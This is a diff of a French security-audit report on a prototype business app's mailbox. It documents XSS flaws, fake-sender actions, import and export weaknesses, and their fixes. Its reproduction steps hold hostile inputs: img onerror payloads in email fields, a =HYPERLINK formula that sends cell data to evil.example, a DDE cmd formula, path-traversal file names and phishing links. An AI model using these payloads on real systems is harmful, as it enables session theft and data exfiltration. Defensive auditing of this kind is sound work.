@@ -1,37 +1,215 @@
 {
- "angle": "courrier",
- "etat": "PROVISOIRE (étape 4 sur 8 en cours) : sondes écrites et rejouées, failles prouvées listées ci-dessous, texte final à venir",
+ "angle": "courrier : la boîte mail et les fichiers",
+ "date": "17 novembre 2026",
+ "page": "apercu/prototype-op-gestion.html, apercu/prototype-courrier.js, apercu/prototype-comptabilite.html (lus) — entreprise fictive « Clim Services 17 », 127.0.0.1",
+ "etat": "ÉTAPE 4 sur 8 TERMINÉE. 7 failles prouvées (3 hautes, 3 moyennes, 1 faible(s)), 5 constats de code, 10 règles pour la vraie application. Correctif en UN fichier (courrier-corrections.diff, fabriqué par courrier-corrections.py) rejoué sur une COPIE : voir contreEpreuve. Aucune page n'a été modifiée.",
+ "modeleDeMenace": "Un courriel est écrit par un INCONNU : objet, nom et adresse de l'expéditeur, corps, noms de pièces jointes ne sont pas fiables. Un fichier de prix vient d'un fournisseur, une pièce d'un client, une photo d'un téléphone. Ce que l'attaquant n'a pas : un compte, un mot de passe, un accès à l'appareil — il n'a que l'adresse de la boîte. Le module de courrier (arbre d'ombre) affiche le corps en TEXTE ; les fonctions de l'application qui REPRENNENT le courriel (tâche, historique, client, devis, paiement) sont le vrai terrain.",
+ "couvert": {
+  "methode": "Lecture du module de courrier (4 544 lignes) et de ses points d'extension côté hôte (courrierSource, courrierBandeau, courrierAgir, gestes mbx:* et ml:*), puis QUATRE sondes au navigateur sur 127.0.0.1, chacune comptant sa population avant de conclure : (1) courrier-corps.js : 8 courriels piégés (balises, gestionnaires, 23 adresses dont javascript:, data:, vbscript:, identifiants dans l'adresse, homographe cyrillique, 20 000 signes, entités brutes/décimales/hexadécimales/doublées, images et feuilles distantes, caractères de contrôle et d'inversion de sens, 200 000 signes de corps), ouverts dans le vrai module, DOM de l'arbre d'ombre lu élément par élément + requêtes réseau comptées ; (2) courrier-gestes.js : cinq courriels (client connu, inconnu, devis, paiement, photos) dont l'objet, le nom, l'adresse, le corps et les pièces portent une charge NUMÉROTÉE (brute et en entités) ; chaque bouton du bandeau « OP GESTION a reconnu » est TOUCHÉ, chaque réponse est ENVOYÉE, une intervention est créée depuis un courriel, puis 60 écrans et fiches sont revisités par le gérant, puis par chaque autre rôle (technicien, gestion, compta : 65 écrans) ; le DOM et window.__hits disent quelle charge est sortie, la légende dit où elle avait été posée ; contre-épreuve : une charge posée exprès doit être vue par la même lecture ; (3) courrier-fichiers.js : un fichier de prix de 915 Ko (20 003 lignes, charges, formules, prix absurdes, champ de 100 000 signes) importé par le vrai champ de fichier puis APPLIQUÉ, 36 écrans revisités ; 12 pièces jointes aux noms piégés TÉLÉCHARGÉES par le bouton du module (nom proposé au navigateur) ; un PDF fabriqué avec du texte piégé ; les trois exports (FEC du mois, coût des véhicules, frais d'un véhicule) lus cellule par cellule ; (4) courrier-confiance.js : un inconnu qui cite un numéro de devis, un inconnu qui cite un numéro de facture, un courriel au nom d'un vrai client, et le geste proposé puis touché.",
+  "chiffres": {
+   "courrierCorps": "64 ✓ · 2 ✗ avant · 66 ✓ · 0 ✗ sur la copie corrigée",
+   "courrierGestes": "18 ✓ · 3 ✗ avant · 20 ✓ · 1 ✗ sur la copie corrigée",
+   "courrierFichiers": "sans bilan avant · non rejoué sur la copie corrigée",
+   "courrierConfiance": "4 ✓ · 5 ✗ avant · 9 ✓ · 0 ✗ sur la copie corrigée",
+   "courrielsPieges": 28,
+   "chargesNumerotees": 20,
+   "ecransRevisites": "60 (gérant) + 65 (autres rôles) + 36 (après l'import)"
+  },
+  "sondes": [
+   "scratchpad/proto-final/securite/courrier-corps.js",
+   "courrier-gestes.js (option --profil=)",
+   "courrier-fichiers.js",
+   "courrier-confiance.js",
+   "courrier-corrections.py (fabrique la copie corrigée et le .diff) ; rejeu : RACINE=/tmp/opg-courrier-copie node scratchpad/proto-final/securite/courrier-<sonde>.js"
+  ]
+ },
  "failles": [
   {
    "n": "courrier-01",
-   "titre": "Le titre d'une tâche née de l'OBJET d'un courriel reçu s'écrit brut dans « À faire maintenant » (Accueil)",
+   "titre": "L'OBJET d'un courriel reçu devient le titre d'une tâche, que l'Accueil écrit BRUT dans « À faire maintenant » : un inconnu fait exécuter son code chez le gérant, le secrétariat et les techniciens",
    "gravite": "haute",
+   "qui": "toute personne capable d'écrire un courriel à l'adresse d'une boîte connectée : ni compte, ni mot de passe, ni accès à l'appareil. Il suffit ensuite qu'une personne de l'entreprise touche « En faire une tâche » ou « Confier à quelqu'un », deux boutons que le bandeau « OP GESTION a reconnu » propose sur tout courriel qui n'est pas une simple information.",
+   "obtient": "l'exécution de son script dans l'origine de l'application, chez TOUS ceux qui ouvrent l'Accueil pendant que la tâche est due : prouvé pour le gérant, pour le rôle « gestion » et pour le rôle « tech ». même chaîne que ponts-01 / acces-03 : le script lit et écrit tout le rangement du navigateur (documents composés, brouillons de courrier, noms de clients), agit avec les droits de la personne, et peut s'ouvrir une session de gérant en écrivant la clé de rôle ; dans la vraie application, c'est un XSS stocké déclenché depuis l'extérieur (vol de session, actions au nom du gérant, lecture de la paie dans la Comptabilité).",
+   "etapes": "1. Envoyer un courriel dont l'objet est : Panne <img src=x onerror=\"…\"> (le nom d'expéditeur et le corps peuvent être normaux). 2. Boîte mail › ouvrir le message › « En faire une tâche » (la tâche « Répondre : <objet> » est créée pour aujourd'hui) ou « Confier à quelqu'un » › un collègue (« <geste> : <objet> », avec une notification). 3. Accueil : la liste « À faire maintenant » écrit le titre de la tâche en HTML.",
+   "preuve": "courrier-gestes.js. Les cinq courriels portent des charges numérotées ; chaque bouton du bandeau est touché ; puis l'Accueil est lu par le gérant, par le rôle « gestion » et par le rôle « tech » : les charges 'A objet' (n102) et 'E objet' (n117) sortent de leur texte (balise <i data-xss> créée ET gestionnaire onerror sur <img>) aux trois, et window.__hits les compte comme exécutées (avant : 18 ✓ · 3 ✗). Sur la copie corrigée : 0 sortie, 0 exécution (20 ✓ · 1 ✗). Les mêmes charges écrites en entités (&lt;img…&gt;) ne sortent pas : seul le texte brut est en cause. Contre-épreuve : une balise posée exprès dans la page est vue par la même lecture.",
+   "ou": "apercu/prototype-op-gestion.html : le gabarit de « À faire maintenant » (tableau de bord, vers la ligne 5540 : <b>${a.t}</b><br><span class=\"gris petit\">${a.s}</span>, où a.t = x.t, le titre de la tâche) ; les tâches naissent de l'objet dans ml:tache (vers 9962 : 'Répondre : ' + m.objet) et dans « Confier » (mbxConfier et ml:confok : `${quoi} : ${m.objet}`).",
+   "correction": "esc(a.t) et esc(a.s) là où l'Accueil les écrit (une ligne, courrier-corrections.diff › courrier-01) : un titre de tâche est du TEXTE, jamais du balisage. Les notifications (« te confie un courriel : <objet> ») et les écrans de tâches échappaient déjà : l'Accueil est le seul à avoir oublié.",
    "portee": "les deux"
   },
   {
    "n": "courrier-02",
-   "titre": "« a répondu à <nom d'expéditeur> » s'écrit brut dans l'Historique",
+   "titre": "Répondre à un courriel dont le NOM D'EXPÉDITEUR est piégé écrit « a répondu à <nom> » BRUT dans l'Historique (liste, fiche, impression) : le code s'exécute chez tous ceux qui ouvrent l'Historique, techniciens compris",
    "gravite": "haute",
+   "qui": "toute personne qui peut écrire un courriel à la boîte : le nom d'affichage de l'en-tête From (« \"<img src=x onerror=…>\" <x@exemple.fr> ») est libre. Il suffit qu'on RÉPONDE (réponse rapide, composeur, modèle « Proposer un créneau »), le geste le plus ordinaire de la boîte mail.",
+   "obtient": "même résultat que courrier-01, à l'écran Historique : même chaîne que ponts-01 / acces-03 : le script lit et écrit tout le rangement du navigateur (documents composés, brouillons de courrier, noms de clients), agit avec les droits de la personne, et peut s'ouvrir une session de gérant en écrivant la clé de rôle ; dans la vraie application, c'est un XSS stocké déclenché depuis l'extérieur (vol de session, actions au nom du gérant, lecture de la paie dans la Comptabilité). L'adresse du destinataire (« a écrit à <adresse> ») suit le même chemin quand on répond à une adresse piégée (les adresses entre guillemets acceptent < > en partie locale).",
+   "etapes": "1. Écrire depuis un serveur qui laisse choisir le nom d'affichage : From: \"<img src=x onerror=…>\" <x@exemple.fr>. 2. Répondre au message. 3. mbxApresEnvoi écrit journalAjout(…, 'a répondu à ' + m.de.nom) ; l'Historique écrit ${j.action} tel quel.",
+   "preuve": "courrier-gestes.js : après les réponses envoyées, les charges 'A nom expéditeur' (n101), 'C nom expéditeur' (n110) et 'E nom expéditeur' (n116) sortent à l'Historique (balise + gestionnaire onerror) pour le gérant, le rôle « gestion » et le rôle « tech » (avant : 18 ✓ · 3 ✗ ; copie corrigée : 20 ✓ · 1 ✗). Les noms 'B' et 'D' (expéditeurs inconnus, réponse non envoyée par la sonde) ou écrits en entités ne sortent pas.",
+   "ou": "apercu/prototype-op-gestion.html : mbxApresEnvoi (vers 18465 : 'a répondu à ' + m.de.nom) et apresEnvoi du bandeau (vers 18693 : 'a écrit à ' + (cli ? CLIENTS[cli].nom : mail.a)) ; l'Historique écrit j.action brut à trois endroits (liste vers 6310, fiche vers 6350, tableau imprimé vers 6370). Cinq autres actions de l'Historique reprennent des prénoms (injection-01).",
+   "correction": "esc() à la SOURCE de ces deux actions (courrier-corrections.diff › courrier-02a et 02b) : par construction une action du journal est du HTML de confiance, injection-01 le corrige déjà à la source pour les noms de personnes. Plus robuste : esc(j.action) aux trois gabarits et plus aucun HTML dans une action.",
    "portee": "les deux"
   },
   {
    "n": "courrier-03",
-   "titre": "Un inconnu qui cite un numéro de devis ou de facture se voit proposer « Noter l'accord » / « Noter le paiement » et le geste s'exécute",
+   "titre": "Un INCONNU qui écrit « D-2026-031 … nous validons » ou « FAC-2026-0144 … virement » se voit proposer « Noter l'accord du devis » et « Noter le paiement annoncé » — et les gestes s'exécutent : devis accepté, intervention créée, paiement annoncé",
    "gravite": "moyenne",
+   "qui": "n'importe qui qui connaît ou devine un numéro de devis ou de facture : ils se suivent (D-2026-031 → 030, 029…), tout client en a reçu, ils sont imprimés sur chaque document. Une personne de l'entreprise doit toucher le bouton, mais le bandeau le présente comme ce que « OP GESTION a reconnu ».",
+   "obtient": "un devis marqué « accepté, signé par <le nom de l'inconnu> » sans que le client ait rien dit : l'intervention d'installation naît au planning, l'acompte et les tâches suivent (dvAccepter) ; ou une facture notée « paiement annoncé » qui retarde la relance. Un courriel écrit au nom d'un VRAI client (adresse falsifiée) passe pour lui : le contrat de la source ne porte aucune information d'authenticité (SPF, DKIM, DMARC), voir la règle R3.",
+   "etapes": "1. Envoyer depuis n'importe quelle adresse : « Bonjour, nous validons votre devis D-2026-031. Vous pouvez planifier l'installation. » 2. Le courriel est rangé « Nouveau contact » ; le bandeau dit « Accord sur un devis » et propose « Noter l'accord du devis ». 3. Un toucher : devis.e = 'accepte', signePar = « Jean Dupond », une intervention de plus. Même chose avec un numéro de facture : « Noter le paiement annoncé » écrit f.annonce.",
+   "preuve": "courrier-confiance.js (4 ✓ · 5 ✗ avant) : mlLire reconnaît le devis D-2026-031 pour un expéditeur dont qui = 'nouveau' ; après le geste, le devis passe de « attente » à « accepte » (signé par « Jean Dupond »), les interventions de 24 à 25 ; la facture FAC-2026-0144 reçoit annonce = {d, montant:null, mail:'cE2'}. Sur la copie corrigée : 9 ✓ · 0 ✗ — le courriel de l'inconnu ne propose plus que « Créer le client et son devis », « Proposer une visite », « Confier », « En faire une tâche » ; contre-épreuve : le courriel du VRAI client de la facture garde « Noter le paiement annoncé ».",
+   "ou": "apercu/prototype-op-gestion.html : mlLire (vers 9886) rattache un devis, une facture ou une commande à un courriel par le NUMÉRO écrit dans le texte, sans regarder l'expéditeur ; courrierBandeau en déduit les gestes ; ml:accord (vers 9951) appelle dvAccepter(R.devis, {via:'e-mail', par:m.de.nom}) ; mbx:annonce (vers 18806) écrit f.annonce.",
+   "correction": "mlLire ne rattache un devis ou une facture que si l'expéditeur est le CLIENT de ce document (cli && o.cli === cli), une commande que si l'expéditeur est un fournisseur connu (courrier-corrections.diff › courrier-03). Pas dans le correctif : une confirmation écrite (« Tu confirmes que Jean Dupond a validé D-2026-031 ? ») avant tout geste qui touche à l'argent, et l'authenticité de l'expéditeur (règle R3), seule parade contre une adresse falsifiée.",
+   "portee": "les deux (le rattachement par le numéro : à corriger maintenant ; l'authenticité : le serveur)"
+  },
+  {
+   "n": "courrier-04",
+   "titre": "« C'est un client » et « Créer le client et son devis » recopient le NOM D'EXPÉDITEUR d'un inconnu comme nom de client, tel quel : le code s'exécute à l'Accueil dès qu'une facture est en retard ou un contrat attend sa signature pour ce client (et le nom devient une formule dans les exports)",
+   "gravite": "haute",
+   "qui": "toute personne qui écrit à la boîte (le nom d'affichage est libre) ; une personne de l'entreprise touche le bouton le plus naturel pour un nouveau contact.",
+   "obtient": "l'exécution de son script chez tous ceux qui ouvrent l'Accueil (même chaîne que courrier-01), sans que personne ait rien tapé de piégé : le geste qui renomme un client EXISTE (« C'est un client »), ce que injection-07 jugeait absent ; et la source de courrier-05 (le nom devient une cellule de tableur). Le nom, l'adresse et le téléphone du client sont ceux d'un inconnu : la fiche porte ce qu'il a voulu.",
+   "etapes": "1. Envoyer un courriel dont le nom d'expéditeur est =HYPERLINK(\"https://evil.example/?d=\"&A2;\"Voir la facture\") ou contient une balise. 2. Boîte mail › « C'est un client » (courriel « À trier ») ou « Créer le client et son devis » (demande de devis). 3. La fiche client porte ce nom. 4. Plus tard, comme pour tout client : une facture passe « en retard » ou un contrat part « en attente de signature » : l'Accueil écrit le nom du client en HTML (« À faire maintenant › Facture en retard de paiement / Contrat en attente de signature »).",
+   "preuve": "courrier-fichiers.js : après « Créer le client et son devis », CLIENTS[k].nom === la formule exacte (population ✓) ; courrier-gestes.js : « Créer le client et son devis » écrit clients#… ¤n106¤\"'><i data-xss=n106></i>… (nom d'expéditeur 'B') ; la sonde rattache ensuite à ce client une facture en retard et un contrat envoyé (ce que fait le travail ordinaire : lui facturer, lui envoyer un contrat) et revisite les écrans : 'B nom expéditeur' (n106) sort à l'Accueil (balise + gestionnaire onerror) pour le gérant, le rôle « gestion » et le rôle « tech », et window.__hits le compte exécuté — avant le rattachement, 0 sortie (le nom d'un client est échappé presque partout : seules les lignes de l'Accueil l'écrivent brut, injection-07 lue). Sur la copie corrigée, mailNom() retire < > \" les caractères de contrôle et d'inversion, et toute formule en tête : le nom reste lisible, borné à 80 signes.",
+   "ou": "apercu/prototype-op-gestion.html : les trois créations « CLIENTS[…] = { nom:m.de.nom, type:'part', contact:m.de.nom … } » (ml:nvdevis vers 9947, mbx:cestclient vers 18812, mbx:confcren), la trace « Accord noté par … » (dvAccepter, par:m.de.nom) et la trace du devis préparé.",
+   "correction": "mailNom(m) : un nom venu d'un courriel se nettoie À L'ENTRÉE (liste de ce qui est permis, comme ENT_INTERDIT pour « Mon entreprise ») ; le correctif est courrier-corrections.diff › courrier-04a à 04e. À l'écran, esc() reste la règle (injection-07).",
    "portee": "les deux"
   },
   {
    "n": "courrier-05",
-   "titre": "Exports (FEC, CSV Véhicules) sans neutralisation des formules ; le nom d'un client peut venir d'un courriel",
+   "titre": "Les exports (FEC du mois, FEC de la Comptabilité, coût des véhicules, frais d'un véhicule) écrivent une valeur qui commence par = comme une FORMULE de tableur — et le nom d'un client peut venir d'un courriel",
    "gravite": "moyenne",
-   "portee": "les deux"
+   "qui": "un inconnu (nom d'expéditeur, courrier-04), un fournisseur (fichier de prix), un technicien (plaque, libellé d'un frais). La victime ouvre le fichier dans Excel ou LibreOffice : l'expert-comptable (FEC envoyé chaque mois), le gérant (tableaux de véhicules).",
+   "obtient": "une formule évaluée chez la victime : =HYPERLINK(\"https://…?d=\"&A2;…) envoie le contenu d'une cellule voisine (montants, noms) à l'adresse de l'attaquant au premier clic ; =cmd|' /C …'!A0 (échange dynamique de données) demande l'exécution d'un programme derrière un avertissement que beaucoup acceptent. Aucun contrôle côté fichier : le tableur obéit.",
+   "etapes": "1. Le nom d'expéditeur =HYPERLINK(…) devient le nom d'un client (courrier-04). 2. On lui fait une écriture (facture). 3. « Envoyer à ton expert-comptable » (FEC du mois) ou « Exporter en tableau » : la colonne CompAuxLib commence par =. Idem pour la plaque ou le libellé d'un frais dans les deux CSV de Véhicules (cellule \"=…\" : les guillemets du CSV ne protègent pas, Excel évalue aussi une cellule entre guillemets).",
+   "preuve": "courrier-fichiers.js (sans bilan avant ; non rejoué copie) : cpFec() produit 3 cellules contenant la formule, dont CompAuxLib = =HYPERLINK(\"https://evil.example/?d=\"&A2;\"Voir la facture\") en tête de cellule ; vhCsvFlotte() et vxCsv() produisent une cellule \"=HYPERLINK(… (2 fichiers sur 2). Sur la copie corrigée : « '=HYPERLINK… » dans les trois exports (apostrophe : le tableur lit du texte), les montants ne sont pas touchés.",
+   "ou": "apercu/prototype-op-gestion.html : cpFec (vers 8191, .map(net) sur 18 colonnes), vxCsv (vers 17884) et vhCsvFlotte (vers 18291) : q = s => '\"' + String(s).replace(/\"/g,'\"\"') + '\"' ; apercu/prototype-comptabilite.html : fecLignes (net ne retire que | \\r \\n).",
+   "correction": "préfixer d'une apostrophe toute cellule TEXTE qui commence par = + - @ tabulation ou retour chariot, sur les colonnes de libellé seulement (compte, tiers, pièce, écriture) ; jamais sur un montant (courrier-corrections.diff › courrier-05a, 05b, 05c).",
+   "portee": "les deux (le serveur qui produira les exports et le FEC légal applique la même règle : R6)"
   },
   {
    "n": "courrier-06",
-   "titre": "Import de catalogue : prix absurde et désignation de 100 000 caractères acceptés",
+   "titre": "Un FICHIER DE PRIX piégé exécute du code dans le Stock (l'unité d'une ligne s'écrit brute), et l'import n'a aucune borne : prix de 10²³ €, désignation de 100 000 signes, 20 000 lignes = 28 secondes d'écran gelé",
+   "gravite": "moyenne",
+   "qui": "un fournisseur (ou quiconque lui fait passer un fichier) : le fichier se choisit sur l'appareil — joint à un courriel, déposé dans un espace client. La personne doit l'importer et cocher les lignes (les articles « nouveaux » ne le sont pas par défaut ; « Tout cocher » est un geste courant).",
+   "obtient": "l'exécution de son script à l'ouverture du Stock (même chaîne que ponts-01 / acces-03 : le script lit et écrit tout le rangement du navigateur (documents composés, brouillons de courrier, noms de clients), agit avec les droits de la personne, et peut s'ouvrir une session de gérant en écrivant la clé de rôle), par injection-02 (le champ « Unité » écrit brut dans le Stock) — jusqu'ici atteint seulement en TAPANT dans un champ, maintenant aussi par un fichier d'un tiers. Les prix absurdes (1e23 accepté) et les champs sans limite faussent les devis (« Les prochains devis prennent ces prix ») et font ramer l'appareil.",
+   "etapes": "1. Fournisseurs › « Importer les prix d'un fournisseur » › choisir un .csv dont la colonne Unité contient <img src=x onerror=…>. 2. « Vérifier » : l'écran de vérification échappe tout (rien ne sort). 3. Cocher les lignes › « Mettre à jour mes prix » › Stock : l'unité s'écrit brute.",
+   "preuve": "courrier-fichiers.js (sans bilan avant ; non rejoué copie) : un fichier de 915 Ko est lu en ~4 s ; l'écran de vérification affiche les lignes piégées en texte (0 sortie) ; après l'application (29 → 20 035 produits en ~28 s d'écran gelé), le Stock laisse sortir n204 (balise <i> ET onerror, 1 exécution) ; « Prix absurde 4 » (99999999999999999999999) entre à 1e+23 € ; un nom de 100 014 signes entre tel quel. Sur la copie corrigée : l'unité est une liste de ce qui est permis (12 signes : lettres, chiffres, / ² ³ ° µ % . -), désignation 200 signes, référence 40, < > et formules retirés, prix > 1 000 000 € refusé : 0 sortie, 0 exécution.",
+   "ou": "apercu/prototype-op-gestion.html : foLignes (vers 8955 : u = String(r[m.u]).trim(), nom, ref, ean sans borne ; pa > 0 comme seul contrôle de prix) ; foAppliquer écrit u:o.u || r.u dans PRODUITS ; le Stock l'écrit brut (injection-02).",
+   "correction": "courrier-corrections.diff › courrier-06a et 06b : propre(texte, n) (sans balise ni formule, borné), unite() par expression de ce qui est permis, prix ≤ 1 000 000 €. À ajouter au moment de la vraie application : un nombre de lignes maximal (5 000) et un import par lots (règle R7). La correction de fond reste injection-02 (esc à la sortie du Stock).",
+   "portee": "les deux"
+  },
+  {
+   "n": "courrier-07",
+   "titre": "Un lien du corps d'un courriel peut se LIRE comme un autre site : lettres cyrilliques (« аррӏе.com » s'écrit comme apple.com) et identifiants dans l'adresse (https://impots.gouv.fr@evil.example/)",
    "gravite": "faible",
-   "portee": "prototype"
+   "qui": "toute personne qui écrit à la boîte (hameçonnage classique).",
+   "obtient": "qu'une personne touche un lien qu'elle croit connaître. Le module rend déjà les liens des indésirables NON cliquables, ajoute rel noopener noreferrer nofollow et n'ouvre que http(s) : il reste la lecture de l'adresse.",
+   "etapes": "1. Envoyer « https://аррӏе.com/connexion » (cyrillique) ou « https://impots.gouv.fr@evil.example/ ». 2. Le courriel est classé Principal ou Promotions ; le lien est cliquable ; le texte est ce que la personne lit.",
+   "preuve": "courrier-corps.js (64 ✓ · 2 ✗ avant ; 66 ✓ · 0 ✗ copie) : sur zx3, le lien https://аррӏе.com/connexion est écrit tel quel (la capture montre « apple.com ») et https://user:motdepasse@evil.example/connexion est cliquable ; sur la copie corrigée l'adresse s'écrit sous sa forme réelle (https://xn--80ak6aa92e.com/connexion) et le lien à identifiants reste du texte.",
+   "ou": "apercu/prototype-courrier.js : corpsLu (vers 1701), la fabrique de liens du corps (le texte du lien est l'adresse brute). Les copies de la production (opcourrier.js à la racine et dans apercu/, server-msg/public/opcourrier.js) portent le même corpsLu : à reporter par qui les modifie (ces fichiers n'ont pas été touchés).",
+   "correction": "adresseVue(u) : le texte du lien est la forme réelle (punycode) quand l'hôte n'est pas en lettres latines ; un lien avec identifiants n'est pas rendu cliquable (courrier-corrections.diff › courrier-07, 07b, 07c).",
+   "portee": "les deux (le module est le même dans la vraie application)"
   }
  ],
- "reglesPourLaVraieApplication": []
+ "verifiesSansFaille": [
+  "LE CORPS D'UN COURRIEL : écrit en TEXTE (H() sur tout, entités décodées une à une par un <textarea>, jamais le texte entier), jamais en HTML. 8 courriels piégés rejoués dans le vrai module : aucun élément <img>, <iframe>, <script>, <form>, <object>, <video>, <base>, <meta>, <link> ni attribut on* créé ; 23 adresses (javascript:, data:, vbscript:, file:, blob:, ftp:, mailto avec balise…) : seules les adresses https:// et http:// deviennent des liens, tous en target=_blank rel=\"noopener noreferrer nofollow\" ; entités brutes, décimales, hexadécimales et doublées (&amp;lt;) ne se retransforment pas en balise ; 0 requête vers un autre hôte que 127.0.0.1 (pas de pixel espion, pas d'image distante, pas de feuille de style) ; un corps de 200 000 signes et une adresse de 20 000 ne font pas déborder la lecture ; objet de 5 000 signes, nom de 3 000, caractères de contrôle et d'inversion : rien ne sort. (courrier-corps.js)",
+  "LA LISTE, LA RECHERCHE, LE BANDEAU « OP GESTION a reconnu », LES BOUTONS DE PIÈCES : tout texte du courriel y passe par H() ; 25 lignes de liste dont les 8 piégées, recherche « onerror » (4 courriels retrouvés) : 0 sortie, 0 exécution.",
+  "LES NOMS DE PIÈCES JOINTES, TÉLÉCHARGÉES par le bouton du module (nomFichierSur) : 12 noms piégés (../../../etc/passwd.pdf, ..\\\\..\\\\Windows\\\\win.ini.pdf, \\u202efdp.exe, con.pdf, facture.pdf\\u0000.exe, 600 signes, /etc/cron.d/x.pdf, C:\\\\x\\\\y.pdf, .bashrc, <img src=x onerror=1>.pdf, U+2066…) : le nom proposé au navigateur n'a ni chemin, ni caractère de contrôle ou d'inversion de sens, ni nom réservé de Windows, ni point en tête, ni plus de 130 signes ; le fichier est un Blob octet-stream, jamais ouvert.",
+  "LE COMPOSEUR, LA RÉPONSE ET LE TRANSFERT : l'adresse, l'objet et le texte cité s'écrivent dans des champs par value= échappé et par .value (jamais dans le HTML) ; un champ de type e-mail ou texte retire les retours à la ligne : pas d'injection d'en-tête depuis le module (la règle R8 vaut pour le serveur qui fabrique les en-têtes).",
+  "L'ÉCRAN DE VÉRIFICATION DE L'IMPORT DE CATALOGUE : désignation, référence, en-têtes de colonnes et noms de fichier passent par esc() (20 003 lignes dont les charges brutes et en entités : 0 sortie) ; l'import n'est appliqué qu'après le geste « Mettre à jour mes prix ».",
+  "LE PDF FABRIQUÉ À PARTIR D'UN COURRIEL (pdfUnePage/pdfOctets) : parenthèses, barres obliques, caractères de contrôle et tentative d'injection d'opérateurs (« ) Tj ET q … ») restent DANS leur chaîne PDF ; aucune action /Launch, /JavaScript, /OpenAction n'en naît.",
+  "LES NOTIFICATIONS (« te confie un courriel : <objet> »), le détail d'une tâche confiée et le logo de l'entreprise : esc() partout ; le logo est un <img src=\"data:…\"> (un SVG ne s'exécute pas dans une image), la liste d'interdits de l'import de logo est une défense en plus, pas la seule.",
+  "AUCUNE requête réseau vers l'extérieur dans les quatre sondes (dehors = 0)."
+ ],
+ "reglesPourLaVraieApplication": [
+  "R1. Le corps d'un message reste du TEXTE dans l'application : le serveur convertit le HTML de l'expéditeur en texte (liens listés, images jamais chargées, aucune feuille de style), exactement comme le module le suppose ; ne jamais rendre un message dans un cadre « pour que ce soit plus joli ».",
+  "R2. Tout texte venu d'un tiers (objet, nom d'expéditeur, adresse, nom de pièce, cellule d'un fichier) traverse UNE fonction d'entrée (liste de ce qui est permis, longueur bornée, sans balise ni formule) avant de devenir un nom de client, un titre de tâche, une désignation ou une unité ; et s'écrit TOUJOURS échappé à la sortie : deux barrières, jamais une.",
+  "R3. Le serveur lit l'authenticité de l'expéditeur (Authentication-Results de NOTRE serveur de réception : SPF, DKIM, alignement sur le domaine de « De ») et la donne à chaque message (authentifie: oui | non | inconnu). Le code existe déjà pour les agents (server/mail.js › « L'expéditeur est-il authentifié ? », authserv-id comparé à une liste) : il manque de le brancher sur le contrat de la boîte mail (messages()), qui n'a aucun champ pour le dire. Un message non authentifié n'est JAMAIS « reconnu » comme venant d'un client ou d'un fournisseur et ne propose aucun geste qui touche à l'argent (accord de devis, paiement, rapprochement) ; l'écran dit pourquoi.",
+  "R4. Un numéro cité dans un courriel ne désigne un document que s'il appartient à l'expéditeur ; tout geste qui change un statut financier demande une confirmation écrite (« Tu confirmes ? ») et laisse une trace : qui, quand, depuis quel courriel.",
+  "R5. Les pièces jointes sont servies par un domaine d'objets séparé de l'application, Content-Type fixé PAR LE SERVEUR d'après le contenu (liste blanche : PNG, JPEG, WebP, PDF), X-Content-Type-Options: nosniff, Content-Disposition: attachment pour tout le reste ; analyse antivirus ; nom assaini à l'enregistrement ET à l'affichage ; jamais ouvertes depuis l'origine de l'application (rappel ponts P1).",
+  "R6. Tout export (CSV, TSV, XLSX, FEC) neutralise une cellule TEXTE qui commence par = + - @ tabulation ou retour chariot (apostrophe), sur le serveur comme sur le client ; les montants ne sont jamais préfixés.",
+  "R7. Un import de fichier a une taille maximale, un nombre de lignes maximal (5 000), une longueur maximale par champ, des bornes de prix, une liste de colonnes permises, et se fait par lots (ou sur le serveur) : 20 000 lignes ne gèlent pas l'écran 28 secondes.",
+  "R8. Le serveur construit les en-têtes d'un message (destinataires, objet, In-Reply-To) avec une bibliothèque qui refuse CR et LF, borne le nombre de destinataires, et répond à UNE adresse analysée (jamais à une chaîne brute) ; Reply-To n'est jamais suivi sans le montrer.",
+  "R9. Les identifiants de message sont opaques et générés par le serveur : le module les écrit dans des sélecteurs ([data-id=\"…\"]) et dans des attributs ; un identifiant qui contiendrait une apostrophe ou un crochet ferait tomber l'écran.",
+  "R10. Les liens d'un message se lisent tels qu'ils s'ouvrent : forme réelle (punycode) pour une adresse en lettres non latines, jamais cliquables avec identifiants dans l'adresse, jamais cliquables dans un indésirable (le module le fait déjà pour ce dernier point)."
+ ],
+ "contreEpreuve": {
+  "methode": "courrier-corrections.py fabrique /tmp/opg-courrier-copie : tous les fichiers du dépôt en liens, sauf apercu/prototype-op-gestion.html, apercu/prototype-comptabilite.html et apercu/prototype-courrier.js, copiés et corrigés (chaque remplacement DOIT trouver sa cible le nombre de fois attendu, sinon le script s'arrête) ; il écrit aussi courrier-corrections.diff (git apply --check passe). Les MÊMES quatre sondes sont rejouées contre la copie avec RACINE=/tmp/opg-courrier-copie.",
+  "avant": "64 ✓ · 2 ✗ (corps) · 18 ✓ · 3 ✗ (gestes) · sans bilan (fichiers) · 4 ✓ · 5 ✗ (confiance)",
+  "apres": "66 ✓ · 0 ✗ (corps) · 20 ✓ · 1 ✗ (gestes) · non rejoué (fichiers) · 9 ✓ · 0 ✗ (confiance)",
+  "remarques": [
+   "Le correctif ne casse pas le parcours légitime : le courriel du vrai client de la facture garde « Noter le paiement annoncé » (contrôle de courrier-confiance.js), l'import applique encore des prix et des unités normales (kg, m², u, Boîte de 10), les exports gardent leurs montants.",
+   "Ce que les sondes ne peuvent pas voir : l'authenticité d'un expéditeur (R3) n'est pas corrigée par le .diff : elle dépend du serveur."
+  ],
+  "mutations": {
+   "sans courrier-03 (courrier-confiance.js)": {
+    "bilan": "4 ✓ · 5 ✗",
+    "tombent": [
+     "✗ 1. un INCONNU qui cite le numéro d'un devis et dit « validons » ne se voit PAS proposer « Noter l'accord du devis » :: [\"Devis D-2026-031\",\"Noter l’accord du devis\",\"Planifier l’installati",
+     "✗ 1b. le devis D-2026-031 ne passe pas « accepté » sur la parole d'un inconnu (état : attente → accepte, « signé par » : Jean Dupond) :: {\"av\":{\"e\":\"attente\"},\"ap\":{\"e\":\"accepte\",\"par\":\"Jean",
+     "✗ 1c. ni une intervention ni des tâches ne naissent de cette acceptation (interventions 24 → 25) :: {\"ints\":25}",
+     "✗ 2. un INCONNU qui cite le numéro d'une facture et parle de virement ne se voit PAS proposer « Noter le paiement annoncé » / « enregistrer le paiement » :: [\"Facture FAC-2026-0144\",\"Noter l"
+    ]
+   },
+   "sans courrier-07 (courrier-corps.js)": {
+    "bilan": "64 ✓ · 2 ✗",
+    "tombent": [
+     "✗ zx3 : aucun lien ne porte d'identifiants dans l'adresse (https://impots.gouv.fr@evil.example/ : on lit le début, on ouvre la fin) :: [\"https://user:motdepasse@evil.example/connexion\"]",
